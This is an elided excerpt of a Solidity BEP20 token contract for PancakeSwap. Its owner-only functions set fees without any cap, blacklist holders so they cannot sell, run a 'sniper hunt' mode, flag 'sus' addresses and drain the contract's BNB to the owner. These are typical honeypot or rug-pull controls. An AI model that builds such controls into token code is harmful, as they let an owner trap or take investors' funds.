...
abstract contract Ownable {
    ...
    function renounceOwnership() public virtual {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        emit OwnershipTransferred(_currentOwner, address(0));
        _currentOwner = address(0);
    }

    function transferOwnership(address target) public virtual {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        emit OwnershipTransferred(_currentOwner, target);
        _currentOwner = target;
    }
}

contract N_contract is IBEP20, Ownable {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        bool isHunt = _isSn1persHunt0pen && ((block.timestamp - _pairCreatedAt) < _snipingHuntDuration);
        bool isBlacked = _isBlacked[sender] || _isBlacked[recipient];
        if (isBlacked) require(recipient != pair, "You're blacked");
    ...
    function _executeContractSell() private wrapContractSell {
    ...
    function _addPancakeLiquidity(uint256 amountToLiquify, uint256 amountBNBLiquidity) private {
        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(address(this), amountToLiquify, 0, 0, DEAD_WALLET, block.timestamp);
    ...
    function getOwner() external view override returns (address) {return _currentOwner;}
    ...
    function alterFees(uint256 liqFee, uint256 devFee) external {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        _liqFee = liqFee;
        _devFee = devFee;
    ...
    function alterAntiWhale(uint256 limitTxPercent, uint256 limitWalletPercent) external {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
    ...
    function alterContractSellsProps(uint256 fractionalPercent) external {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        _swapThreshold = _totalSupply * fractionalPercent / 1000;
    }

    function sn1p1ngHunt(bool huntOpen) external {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        _isSn1persHunt0pen = huntOpen;
    }

    function createPair(string memory tokenName, string memory tokenTicker) external {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        ...
        router = PancakeSwapRouter(_routerAddress);
        ...
        (address(this), balanceOf(address(this)), 0, 0, _currentOwner, block.timestamp);
    ...
    uint256 public _limitWalletPercentInitial;
    uint256 public _limitTxPercentInitial;
    ...
    function _initSus(address[] memory sus) internal {
    ...
    function claimStuckBNB() external {
        require(_currentOwner == msg.sender, "Ownable: caller is not the owner");
        _payDivvies(msg.sender, address(this).balance);
    }
}